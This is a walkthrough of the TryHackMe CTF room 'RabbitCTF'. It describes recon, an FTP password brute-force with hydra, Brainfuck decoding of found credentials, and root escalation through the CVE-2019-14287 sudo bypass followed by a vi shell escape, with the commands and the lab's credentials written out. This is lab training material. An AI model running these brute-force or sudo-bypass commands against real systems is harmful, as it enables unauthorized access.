# TryHackMe: RabbitCTF Walkthrough

## Overview

This CTF involves web enumeration, traffic interception, FTP login brute-forcing, Brainfuck decryption, and privilege escalation via a known CVE exploit.

---

## Recon

### Ports Discovered (via rustscan):
- **21** – FTP  
- **22** – SSH  
- **80** – HTTP  

### Web Enumeration with Feroxbuster:

feroxbuster -u http://rabbit.thm

Interesting Endpoints:

    /assets/style.css

    /icons/openlogo-75.png

    /index.html

    /assets/RickRolled.mp4 (very large file)

Web Exploitation

    Found a secret directory in the source code.

    Used Caido to intercept traffic and uncovered a hidden .png file.

    This image contained FTP credentials hidden in metadata or EXIF.

FTP Credentials Discovered:

    User: ftpuser

    Brute-forced password (using hydra): 5iez1wGXKfPKQ

Hydra Command Used:

hydra -l ftpuser -P password.txt ftp://rabbit.thm -t 4

FTP Loot

    Downloaded a file with Brainfuck encryption.

    Decoded using dcode.fr Brainfuck Decoder

Resulting Credentials:

    User: eli

    Password: DSpDiM1wAEwid

Privilege Escalation
Enumeration with linpeas revealed:

/home/gwendoline/user.txt
/home/gwendoline/.bash_history
/var/www/html/sup3r_s3cret_fl4g/index.html

Found message from root to user gwendoline, suggesting password weakness.
CVE Exploitation
CVE-2019-14287 – Sudo Bypass via UID -1
Sudo Permissions:

sudo -l

Output showed:

(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt

This allowed executing vi as root, bypassing restriction:
Exploit Steps:

sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

Inside vi, escaped to shell:

:!/bin/sh

✅ Gained root access!
Summary
Step	Tool / Method	Result
Port Scanning	rustscan	Found open FTP, SSH, HTTP
Web Enum	feroxbuster, Caido	Discovered hidden .png file
FTP Brute Force	hydra	Cracked FTP password
Decryption	dcode.fr (Brainfuck)	Recovered credentials
Priv Esc	CVE-2019-14287 via sudo	Root shell
Flags Captured

    user.txt: ✅

    root.txt: ✅
